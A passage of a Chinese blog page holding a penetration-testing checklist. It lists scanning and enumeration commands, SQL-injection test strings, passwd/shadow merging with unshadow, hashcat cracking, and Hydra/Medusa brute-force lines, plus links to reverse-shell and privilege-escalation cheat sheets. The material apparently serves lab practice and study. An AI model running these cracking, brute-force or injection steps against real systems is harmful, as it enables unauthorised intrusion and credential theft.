<span class="line"><span># 可以使用的 hash-identifier 识别 hash 类型，使用 hashcat 破解 hash</span></span>
<span class="line"><span>hashcat -m 400 -a 0 &#x3C;hash file> &#x3C;wordlist file></span></span>
<span class="line"><span># 对于其他服务，可以使用 Medusa 或 hydra</span></span>
<span class="line"><span>Hydra -L &#x3C;username file> -P &#x3C;Password file> -v &#x3C;ip-address> ssh </span></span>
<span class="line"><span>Medusa -h &#x3C;ip-address> -U &#x3C;username file> -P &#x3C;password file> -M http -m DIR:/admin -T 30</span></span></code></pre>
<hr>
<h1 id="数据包抓取">数据包抓取<a class="anchor-link" href="#数据包抓取"><span class="icon icon-link"></span></a></h1>
<p>使用 wireshark / tcpdump 获取目标主机的流量</p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>tcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv</span></span></code></pre>
<hr>
<h1 id="参考资料">参考资料<a class="anchor-link" href="#参考资料"><span class="icon icon-link"></span></a></h1>
<p>NMAP Cheatsheet
<a href="https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf">https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf</a>
Exploit-DB
<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>
Kernel Exploits
<a href="https://www.kernel-exploits.com/">https://www.kernel-exploits.com/</a>
Privilege Escalation Linux
<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>
&#x3C;Linux Pentest Commands
<a href="http://www.networkpentest.net/p/linuxunix-command-list.html">http://www.networkpentest.net/p/linuxunix-command-list.html</a>
Windows Command Line Cheatsheet
<a href="https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf">https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf</a>
Privilege Escalation Windows:
<a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a>
<a href="http://toshellandback.com/2015/11/24/ms-priv-esc/">http://toshellandback.com/2015/11/24/ms-priv-esc/</a>
Windows Priv Esc cheatsheet
<a href="http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html">http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html</a>
Pentest References:
<a href="http://www.vulnerabilityassessment.co.uk/">http://www.vulnerabilityassessment.co.uk/</a>
<a href="http://www.0daysecurity.com/penetration-testing/enumeration.html">http://www.0daysecurity.com/penetration-testing/enumeration.html</a>
Reverse Shell:
<a href="https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/">https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/</a>
<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>
<a href="http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html">http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html</a>
<a href="http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/">http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a>
Shell Escape:
<a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells</a>
Pentestmonkey Cheat Sheets (SQL Injection)
<a href="http://pentestmonkey.net/category/cheat-sheet">http://pentestmonkey.net/category/cheat-sheet</a></p> </div>  <astro-island uid="Z1v8zuY" prefix="r16" component-url="/_astro/EmbedHydrator.BYQxiqHV.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;EmbedHydrator&quot;,&quot;value&quot;:true}"></astro-island> <astro-island uid="27sCYi" prefix="r17" component-url="/_astro/CustomContentEnhancer.BXo4OX_Z.js" component-export="CustomContentEnhancer" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;config&quot;:[0,{&quot;addBlankTarget&quot;:[0,true],&quot;smoothScroll&quot;:[0,true],&quot;addHeadingLevel&quot;:[0,true],&quot;enhanceCodeBlock&quot;:[0,true],&quot;enableCodeCopy&quot;:[0,true],&quot;enableCodeFullscreen&quot;:[0,true],&quot;enableLinkEmbed&quot;:[0,true],&quot;enableTweetEmbed&quot;:[0,true],&quot;enableOGPreview&quot;:[0,true],&quot;previewCacheTime&quot;:[0,3600],&quot;lazyLoadEmbeds&quot;:[0,true]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;CustomContentEnhancer&quot;,&quot;value&quot;:true}"></astro-island> </article> <astro-island uid="wBKw9" prefix="r4" component-url="/_astro/GiscusComments.BNQOQ1R1.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;GiscusComments&quot;,&quot;value&quot;:true}" await-children><div class="w-full pb-12"></div><!--astro:end--></astro-island> </div>  <div class="tablet:grid-cols-1 grid grid-cols-2 gap-4 px-10 md:px-6"><div class="flex flex-col gap-4"><h2 class="text-foreground/80 text-2xl font-semibold">推荐文章</h2><div class="flex flex-col gap-2"><a href="/blog/post/8" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">1</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Others</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Astro博客搭建</div></div></a><a href="/blog/post/11" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">2</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Penetration</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Common process for handling objectives</div></div></a><a href="/blog/post/2" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">3</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">GodenEye</div></div></a><a href="/blog/post/10" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">4</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Penetration</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Mandatory manual</div></div></a><a href="/blog/post/1" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">5</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Metasploitable-1</div></div></a></div></div><div class="flex flex-col gap-4"><h2 class="text-foreground/80 text-2xl font-semibold"></h2><div class="flex flex-col gap-2 -mt-4 pt-12 md:-mt-5 md:pt-0"><a href="/blog/post/3" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">6</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Mr-Robot</div></div></a><a href="/blog/post/7" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">7</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Kioptrix level 3</div></div></a><a href="/blog/post/4" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">8</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Kioptrix level 1</div></div></a><a href="/blog/post/5" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">9</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Metasploitable-2</div></div></a><a href="/blog/post/9" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">10</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Linux</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Debian13 桌面环境</div></div></a></div></div></div><footer class="mt-auto pb-6 md:pb-4"><div class="mx-auto flex flex-col items-center gap-3 px-6 md:px-3 max-w-7xl"><div class="text-muted-foreground flex flex-wrap items-center justify-center gap-6 text-sm md:gap-4"><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="站点总字数"><i class="fa-regular fa-file-lines text-sm" aria-hidden="true"></i><span class="font-medium">8k</span><span class="text-xs">字</span></button><div class="bg-muted-foreground/30 h-4 w-px"></div><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="站点阅读时长"><i class="fa-regular fa-clock text-sm" aria-hidden="true"></i><span class="font-medium">0:47</span></button><div class="bg-muted-foreground/30 h-4 w-px"></div><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="文章总数"><i class="fa-regular fa-newspaper text-sm" aria-hidden="true"></i><span class="font-medium">11</span><span class="text-xs">篇</span></button></div><div class="text-muted-foreground flex items-center gap-0.5 text-sm"><span class="opacity-75">Â©</span><span class="font-medium opacity-75">2022</span><span class="opacity-50">-</span><span class="font-medium opacity-75" itemProp="copyrightYear">2026</span><svg class="mx-1 size-5 animate-spin text-[#FFC0CB] duration-10000" viewBox="0 0 512 512" fill="currentColor"><g><path fill="currentColor" d="M330.555,101.873c0-34.164-13.767-65.108-36.047-87.622c-2.432-2.465-9.63-4.349-14.212,3.466
		c-4.589,7.808-17.205,27.431-17.205,27.431c-1.534,2.438-4.219,3.918-7.089,3.918c-2.883,0-5.555-1.48-7.089-3.918
		c0,0-12.623-19.623-17.205-27.431c-4.582-7.815-11.781-5.931-14.219-3.466c-22.274,22.514-36.04,53.458-36.04,87.622
		c0,51.02,30.663,94.847,74.553,114.142C299.892,196.72,330.555,152.892,330.555,101.873z"></path><path fill="currentColor" d="M204.51,253.425c-4.78-47.705-36.998-90.409-85.518-106.176c-32.492-10.554-66.177-7.027-94.47,7.205
		c-3.096,1.555-7.117,7.822-1.096,14.589c6.007,6.774,20.766,24.842,20.766,24.842c1.849,2.212,2.432,5.22,1.542,7.952
		c-0.891,2.74-3.13,4.829-5.918,5.528c0,0-22.562,5.945-31.404,7.89c-8.849,1.945-9.281,9.37-7.692,12.445
		c14.527,28.144,39.698,50.801,72.197,61.362C121.436,304.828,172.6,289.212,204.51,253.425z"></path><path fill="currentColor" d="M96.772,362.484c-20.082,27.643-27.136,60.766-22.342,92.074c0.527,3.424,5.233,9.178,13.527,5.554
		c8.308-3.63,30.054-12.088,30.054-12.088c2.672-1.062,5.698-0.692,8.041,1c2.329,1.692,3.623,4.466,3.418,7.335
		c0,0-1.308,23.294-2.199,32.315c-0.883,9.006,6.048,11.712,9.466,11.15c31.252-5.116,60.581-22.054,80.662-49.704
		c29.993-41.266,30.944-94.758,6.781-136.155C177.332,303.773,126.758,321.204,96.772,362.484z"></path><path fill="currentColor" d="M287.824,313.964c-24.165,41.397-23.212,94.888,6.78,136.155c20.082,27.65,49.41,44.588,80.663,49.704
		c3.418,0.562,10.349-2.144,9.466-11.15c-0.89-9.021-2.205-32.315-2.205-32.315c-0.198-2.869,1.102-5.643,3.431-7.335
		c2.322-1.692,5.363-2.062,8.034-1c0,0,21.746,8.458,30.047,12.088c8.294,3.623,13.007-2.13,13.534-5.554
		c4.787-31.308-2.254-64.43-22.342-92.074C385.246,321.204,334.672,303.766,287.824,313.964z"></path><path fill="currentColor" d="M503.6,215.254c-8.849-1.945-31.41-7.89-31.41-7.89c-2.795-0.706-5.027-2.788-5.918-5.528
		c-0.89-2.732-0.308-5.74,1.534-7.952c0,0,14.76-18.068,20.78-24.842c6.014-6.766,1.993-13.034-1.096-14.589
		c-28.301-14.232-61.978-17.76-94.485-7.205c-48.519,15.767-80.731,58.472-85.512,106.176
		c31.91,35.787,83.067,51.403,131.593,35.636c32.492-10.561,57.67-33.218,72.191-61.362
		C512.867,224.624,512.449,217.199,503.6,215.254z"></path></g></svg><span class="author font-medium opacity-75" itemProp="copyrightHolder">Kaguya<!-- -->@Kaguya</span></div><div class="text-muted-foreground/80 flex items-center gap-2 text-xs"><span class="opacity-75">Powered by theme</span><a href="https://github.com/XueHua-s/astro-snow" target="_blank" rel="noreferrer" class="footer-link font-medium transition-all duration-300">snow-koharu</a><span class="opacity-50">In·</span><span class="opacity-75">From by</span><a href="https://github.com/amehime/hexo-theme-shoka" target="_blank" rel="noreferrer" class="footer-link font-medium transition-all duration-300">astro-koharu</a></div></div></footer> </div> </div> </div>  </main> <div id="floating-nav" class="text-primary fixed right-4 bottom-4 z-50 flex flex-col gap-2" data-expanded="true" data-astro-cid-uwaxo4qb> <div id="nav-content" class="flex scale-y-100 flex-col gap-2 opacity-100" data-astro-cid-uwaxo4qb> <button id="scroll-to-top" class="bg-background/80 hover:bg-background rounded-full p-2 shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="回到顶部" title="回到顶部" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-angle-up text-lg" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> <button id="scroll-to-bottom" class="bg-background/80 hover:bg-background rounded-full p-2 shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="滚到底部" title="滚到底部" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-angle-down text-lg" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> </div> <button id="toggle-nav" class="flex-center bg-background/80 hover:bg-background size-9 rounded-full shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="展开/收起工具栏" title="展开/收起工具栏" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-wand-magic-sparkles menu-nav-icon hidden text-sm transition-transform duration-300" aria-hidden="true" data-astro-cid-uwaxo4qb></i> <i class="fa-solid fa-xmark close-nav-icon text-sm transition-transform duration-300" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> </div> <script type="module" src="/_astro/FloatingGroup.astro_astro_type_script_index_0_lang.CfPC7qUw.js"></script>  <astro-island uid="1rYta6" prefix="r19" component-url="/_astro/MobileDrawerPanel.D2RaSu2k.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;MobileDrawerPanel&quot;,&quot;value&quot;:true}" await-children><div id="drawer-overlay" class="fixed inset-0 z-[60] bg-black/50 hidden" role="presentation" aria-hidden="true"></div><div id="mobile-drawer" class="bg-gradient-start tablet:flex fixed inset-y-0 left-0 z-[70] hidden h-screen w-[70vw] min-w-64 transform px-4 pt-6 shadow-lg backdrop-blur-sm transition-transform duration-300 md:px-0 -translate-x-full" role="dialog" aria-label="导航菜单" aria-modal="true"><div class="flex h-full w-full flex-col overflow-auto"><div class="flex justify-end pb-2 pr-4"><div class="flex" id="close-drawer"><button class="flex-center text-shoka size-10 cursor-pointer rounded-full bg-white/20 select-none hidden" aria-label="关闭菜单" aria-expanded="false" type="button"><i class="text-xl fa-solid fa-xmark" aria-hidden="true" style="opacity:1;transform:rotate(90deg)"></i></button></div></div><astro-slot> <div class="page-home-sider shadow-home-sider sticky top-0 self-start max-w-64 flex-col overflow-hidden h-screen min-h-0 items-center tablet:flex mt-4 hidden w-full min-w-full p-0"> <astro-island uid="1hHpJc" prefix="r15" component-url="/_astro/HomeSiderPanel.DH6R6lQo.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;type&quot;:[0,&quot;post&quot;],&quot;defaultSegmentType&quot;:[0,&quot;directory&quot;],&quot;homeInfo&quot;:[0,{&quot;avatar&quot;:[0,&quot;/img/724d7fb480c8ac0db472ca5c7e36d239.jpg&quot;],&quot;name&quot;:[0,&quot;Kaguya&quot;],&quot;description&quot;:[0,&quot;ACG / 养猫人 / 菜逼 / 黑客 / 臭美&quot;],&quot;postCount&quot;:[0,11],&quot;categoryCount&quot;:[0,4],&quot;tagCount&quot;:[0,8],&quot;routes&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;首页&quot;],&quot;path&quot;:[0,&quot;/blog&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-house-chimney&quot;]}],[0,{&quot;name&quot;:[0,&quot;文章&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-pen-nib&quot;],&quot;children&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;分类&quot;],&quot;path&quot;:[0,&quot;/blog/categories&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-layer-group&quot;]}],[0,{&quot;name&quot;:[0,&quot;标签&quot;],&quot;path&quot;:[0,&quot;/blog/tags&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-tags&quot;]}]]]}],[0,{&quot;name&quot;:[0,&quot;友链&quot;],&quot;path&quot;:[0,&quot;/blog/friends&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-link&quot;]}],[0,{&quot;name&quot;:[0,&quot;关于&quot;],&quot;path&quot;:[0,&quot;/blog/about&quot;],&quot;icon&quot;:[0,&quot;fa-regular fa-circle-user&quot;]}]]],&quot;currentPath&quot;:[0,&quot;/blog/post/11/&quot;]}],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;nmap基本扫描&quot;],&quot;text&quot;:[0,&quot;Nmap基本扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;],&quot;text&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-端口的枚举&quot;],&quot;text&quot;:[0,&quot;针对 web 端口的枚举&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对已知的服务进行攻击尝试搜索漏洞信息&quot;],&quot;text&quot;:[0,&quot;针对已知的服务进行攻击尝试，搜索漏洞信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-页面的测试&quot;],&quot;text&quot;:[0,&quot;针对 web 页面的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-netbiossmbrpc-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 NETBIOS、SMB、RPC 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-smtp-端口的尝试&quot;],&quot;text&quot;:[0,&quot;针对 SMTP 端口的尝试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-snmp-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 SNMP 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-ftp-端口测试&quot;],&quot;text&quot;:[0,&quot;针对 FTP 端口测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;密码破解&quot;],&quot;text&quot;:[0,&quot;密码破解&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;数据包抓取&quot;],&quot;text&quot;:[0,&quot;数据包抓取&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;参考资料&quot;],&quot;text&quot;:[0,&quot;参考资料&quot;]}]]],&quot;tocNumbering&quot;:[0,true],&quot;seriesPostItems&quot;:[1,[[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/common-process-for-handling-objectives&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Common process for handling objectives&quot;],&quot;date&quot;:[3,&quot;2026-02-05T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Nmap基本扫描\n```\nnmap -Pn -p- -vv\nnmap -Pn -p- -sU -vv\n```\n***\n# 针对端口指纹和漏洞的扫描\n```\nNmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &lt;ip address&gt;\n# 使用nc查看banner\nnc -nv &lt;ip-address&gt; &lt;port&gt;\n```\n***\n# 针对 web 端口的枚举\n```\nNikto -port {web ports} -host &lt;ip address&gt; -o &lt;output file.txt&gt;\n# 目录扫描\nDirb http{s}://&lt;ip address&gt;:&lt;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt\nGobuster -u http://&lt;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt\n#如果想测试文件包含漏洞，可以使用 fimap：\nfimap -u &lt;ip-address&gt;\n```\n***\n# 针对已知的服务进行攻击尝试，搜索漏洞信息\n```\nSearchsploit &lt;service name&gt;\n```\n漏洞来源：\n&lt;https://www.securityfocus.com/vulnerabilities&gt;\n***\n# 针对 web 页面的测试\n检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget\n在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险\n检查 HTTP 选项\n```\n测试输入表单参数（比如 1&#39; or 1=1 limit 1; # AND 1&#39; or 1=1--）\n● NULL 或 null\n● &#39;, \&quot;, ;, &lt;!\n  ○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入\n● -, =, +, \&quot;\n  ○ 用于手工 SQL 注入测试\n● &#39;, &amp;, ! , ¦ , &lt; , &gt;\n  ○ 用于找出命令执行漏洞\n● ../\n  ○ 目录穿越漏洞\n```\n***\n# 针对 NETBIOS、SMB、RPC 端口的测试\n```\nenum4linux -a &lt;ip address&gt; Rpcclient &lt;ip address&gt; -U \&quot;\&quot; -N Rpcinfo -p &lt;target ip&gt;\n```\n关于 RPC 历史漏洞的合集：\nhttp://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/\n以下是常用的远程测试命令\n```\nShowmount -e &lt;ip address&gt;/&lt;port&gt; \nMount -t cifs //&lt;server ip&gt;/&lt;share&gt; &lt;local dir&gt; -o username=”guest”,password=”” \nRlogin &lt;ip-address&gt; Smbclient -L &lt;ip-address&gt; -U “” -N Nbtscan -r &lt;ip address&gt; \nNet use &lt;ip-address&gt;$Share “” /u:”” \nNet view &lt;ip-address&gt;\n```\n还可以使用 NMAP 的脚本测试 SMB、DCERPC、NETBIOS\n***\n# 针对 SMTP 端口的尝试\n枚举用户，使用 VRFY 和 EXPN 命令\n***\n# 针对 SNMP 端口的测试\n默认共享名称如：public, private, cisco, manager\n使用工具：\n```\nOnesixtyone –c &lt;community list file&gt; -I &lt;ip-address&gt; Snmpwalk -c &lt;community string&gt; -v&lt;version&gt; &lt;ip address&gt;\n# 默认 MIB：\n1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports\n# 比如枚举运行的进程\nnmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2\n```\n***\n# 针对 FTP 端口测试\n```\n● anonymous 是否可以登录\n● 如果可以登录是否可以使用 get 或 send 操作文件\n● 使用浏览器是否可以访问，ftp://&lt;ip-address&gt;\n```\n***\n# 密码破解\n在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：\n```\nunshadow [passwd-file] [shadow-file] &gt; unshadowed.txt\n# 可以使用的 hash-identifier 识别 hash 类型，使用 hashcat 破解 hash\nhashcat -m 400 -a 0 &lt;hash file&gt; &lt;wordlist file&gt;\n# 对于其他服务，可以使用 Medusa 或 hydra\nHydra -L &lt;username file&gt; -P &lt;Password file&gt; -v &lt;ip-address&gt; ssh \nMedusa -h &lt;ip-address&gt; -U &lt;username file&gt; -P &lt;password file&gt; -M http -m DIR:/admin -T 30\n```\n***\n# 数据包抓取\n使用 wireshark / tcpdump 获取目标主机的流量\n```\ntcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv\n```\n\n\n***\n# 参考资料\nNMAP Cheatsheet\n&lt;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf&gt;\nExploit-DB\n&lt;https://www.exploit-db.com/&gt;\nKernel Exploits \n&lt;https://www.kernel-exploits.com/&gt;\nPrivilege Escalation Linux\n&lt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&gt;\n&lt;Linux Pentest Commands\n&lt;http://www.networkpentest.net/p/linuxunix-command-list.html&gt;\nWindows Command Line Cheatsheet\n&lt;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf&gt;\nPrivilege Escalation Windows:\n&lt;http://www.fuzzysecurity.com/tutorials/16.html&gt;\n&lt;http://toshellandback.com/2015/11/24/ms-priv-esc/&gt;\nWindows Priv Esc cheatsheet\n&lt;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html&gt;\nPentest References:\n&lt;http://www.vulnerabilityassessment.co.uk/&gt;\n&lt;http://www.0daysecurity.com/penetration-testing/enumeration.html&gt;\nReverse Shell:\n&lt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&gt;\n&lt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&gt;\n&lt;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&gt;\n&lt;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/&gt;\nShell Escape:\n&lt;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells&gt;\nPentestmonkey Cheat Sheets (SQL Injection)\n&lt;http://pentestmonkey.net/category/cheat-sheet&gt;&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Common process for handling objectives.md&quot;],&quot;digest&quot;:[0,&quot;be8f31d7c603b057&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;nmap基本扫描\&quot;&gt;Nmap基本扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nmap基本扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -p- -vv&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -p- -sU -vv&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对端口指纹和漏洞的扫描\&quot;&gt;针对端口指纹和漏洞的扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对端口指纹和漏洞的扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &amp;#x3C;ip address&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 使用nc查看banner&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv &amp;#x3C;ip-address&gt; &amp;#x3C;port&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-web-端口的枚举\&quot;&gt;针对 web 端口的枚举&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-web-端口的枚举\&quot;&gt;&lt;span 